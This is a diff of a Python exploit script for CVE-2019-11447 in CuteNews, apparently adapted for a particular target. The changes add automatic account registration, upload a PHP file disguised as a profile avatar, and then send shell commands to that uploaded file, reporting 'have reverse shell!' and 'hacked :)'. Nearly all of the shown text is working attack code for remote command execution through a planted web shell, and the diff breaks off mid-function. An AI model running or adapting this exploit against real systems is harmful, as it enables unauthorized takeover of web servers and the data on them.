@@ -16,13 +16,13 @@ class CVE2019_11447:
         self.url = url
         self.user, self.pwd = user, pwd
         self.session = requests.Session()
-        self.filename = ''.join(random.choice(string.ascii_lowercase) for i in range(5))
+        self.filename = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
         self.kstart = 'dGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ=='
         self.kend = 'dGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU='
 
     def check_version(self):
         print (LogColors.BLUE + "check version..." + LogColors.ENDC)
-        r = self.session.get(self.url.rstrip("/") + "/index.php")
+        r = self.session.get(self.url.rstrip("/") + "/CuteNews/index.php")
         v = re.findall(".*Powered by .*?>(.*)<\/a> ", r.text)
         if v:
             version = v[0]
@@ -33,16 +33,34 @@ class CVE2019_11447:
         else:
             print (LogColors.RED + "error to detect version :(" + LogColors.ENDC)
     
+    def register(self):
+        print (LogColors.BLUE + "register: " + self.user + ":" + self.pwd + "..." + LogColors.ENDC)
+        data = {
+            "action" : "register",
+            "regusername" : self.user,
+            "regnickname" : self.user,
+            "regpassword" : self.pwd,
+            "confirm" : self.pwd,
+            "regemail" : f"{self.user}@hack.me",
+        }
+        r = self.session.post(self.url.rstrip("/") + "/CuteNews/index.php?register",
+                data = data, allow_redirects = False)
+        if r.status_code == 302:
+            print (LogColors.GREEN + "registration successfull :)" + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "failed register new user :(" + LogColors.ENDC)
+            sys.exit()
+
     def login(self):
         print (LogColors.BLUE + "login..." + LogColors.ENDC)
         print (LogColors.YELLOW + self.user + ":" + self.pwd + LogColors.ENDC)
-        r = self.session.get(self.url.rstrip("/") + "/index.php")
+        r = self.session.get(self.url.rstrip("/") + "/CuteNews/index.php")
         data = {
             "username" : self.user,
             "password" : self.pwd,
             "action" : "dologin",
         }
-        r = self.session.post(self.url.rstrip("/") + "/index.php", data = data)
+        r = self.session.post(self.url.rstrip("/") + "/CuteNews/index.php", data = data)
         if r.ok:
             if "Please login" in r.text:
                 print (LogColors.RED + "invalid username, password" + LogColors.ENDC)
@@ -56,7 +74,8 @@ class CVE2019_11447:
     
     def get_signature_key(self):
         print (LogColors.BLUE + "get signature key..." + LogColors.ENDC)
-        r = self.session.get(self.url.rstrip("/") + "/index.php?mod=main&opt=personal")
+        r = self.session.get(self.url.rstrip("/") + "/CuteNews/index.php?mod=main&opt=personal")
+        self.user = re.search('disabled="disabled" value="(.*?)"', r.text).group(1)
         #sk_sd = re.findall('.*name="__signature_key" value="(.*?)".*name="__signature_dsi" value="(.*?)".*', r.text)
         #signature_key, signature_dsi = sk_sd[0][0], sk_sd[0][1]
         tree = lxml.html.fromstring(r.text)
@@ -64,45 +83,55 @@ class CVE2019_11447:
         signature_dsi = tree.xpath('.//input[contains(@name, "__signature_dsi")]/@value')
         signature_key = signature_key[0]
         signature_dsi = signature_dsi[0]
-        print (signature_key, signature_dsi)
         data = {
             "mod" : (None, "main"),
             "opt" : (None, "personal"),
             "__signature_key" : (None, signature_key),
             "__signature_dsi" : (None, signature_dsi),
-            "editpassword" : (None, None),
-            "confirmpassword" : (None, None),
-            "avatar_file" : (self.filename + ".php", open("hack.gif", "rb").read()),
+            "editpassword" : (None, ""),
+            "confirmpassword" : (None, ""),
+            "editnickname" : (None, self.user),
+            "more[site]" : (None, ""),
+            "more[about]" : (None, ""),
+            #"avatar_file" : (self.filename + ".php", open("hack.gif", "rb").read()),
+            #"avatar_file" : (self.filename + ".php", open("cat.gif", "rb").read()),
+            "avatar_file" : (self.user + ".php", open("cats.php", "rb").read()),
         }
         self.payload_data = data
-        print (LogColors.YELLOW + "filename for payload: " + self.filename + LogColors.ENDC)
+        print (self.user)
+        print (LogColors.YELLOW + "filename for payload: " + self.user + LogColors.ENDC)
 
     def upload_payload(self):
         self.check_version()
+        self.register()
         self.login()
         self.get_signature_key()
         print (LogColors.BLUE + "uploading payload..." + LogColors.ENDC)
-        r = self.session.post(self.url.rstrip("/") + "/index.php", files = self.payload_data)
+        r = self.session.post(
+                self.url.rstrip("/") + "/CuteNews/index.php",
+                files = self.payload_data)
         if r.ok:
             print (LogColors.YELLOW + "successfully upload avatar..." + LogColors.ENDC)
         else:
             print (LogColors.RED + "upload avatar failed :(" + LogColors.ENDC)
             sys.exit()
         
-        avatar_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php".format(self.user, self.filename)
-        r = self.session.get(avatar_url)
+        avatar_url = self.url.rstrip("/") + "/CuteNews/uploads/avatar_{}_{}.php".format(
+                self.user, self.user)
+        data = {"cmd" : "ls"}
+        r = self.session.post(avatar_url, data = data)
 
         if r.ok:
-            shell_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php?cmd=<command>".format(self.user, self.filename)
             print (LogColors.YELLOW + "have reverse shell!" + LogColors.ENDC)
-            print (LogColors.YELLOW + shell_url + LogColors.ENDC)
             print (LogColors.GREEN + "successfully checked, hacked :)" + LogColors.ENDC)
         else:
-            print (LogColors.RED + "upload avatar failed :(" + LogColors.ENDC)
+            print (LogColors.RED + "get shell failed :(" + LogColors.ENDC)
 
     def exploit(self, cmd):
-        shell_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php?cmd={}".format(self.user, self.filename, cmd)
-        print (LogColors.YELLOW + "request: " + shell_url + "..." + LogColors.ENDC)
+        url = self.url.rstrip("/") + "/CuteNews/uploads/avatar_{}_{}.php".format(
+                self.user, self.user)
+        data = {"cmd" : cmd}
+        r = self.session.post(url, data = data)
         if r.ok:
             output = r.text[r.text.find(self.kstart) + len(self.kstart):r.text.find(self.kend)].strip()
             if output == '':
